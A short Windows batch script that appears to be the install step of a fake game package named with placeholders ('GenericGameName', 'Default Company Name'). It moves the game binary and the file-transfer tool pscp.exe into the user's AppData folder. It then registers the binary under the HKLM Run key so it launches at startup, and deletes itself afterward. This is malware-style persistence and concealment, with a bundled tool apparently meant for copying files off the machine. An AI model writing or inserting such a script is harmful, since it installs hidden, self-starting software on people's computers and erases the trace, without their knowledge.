@echo off
move /y "%ProgramFiles(x86)%\Default Company Name\GenericGameName\GameProgram.exe" "\Users\%USERNAME%\AppData\Local\GameProgram.exe"
move /y "%ProgramFiles(x86)%\Default Company Name\GenericGameName\pscp.exe" "\Users\%USERNAME%\AppData\Local\pscp.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v GameProgram /t reg_sz /d "/Users/%USERNAME%/AppData/Local/GameProgram.exe"
pause
DEL "%~f0"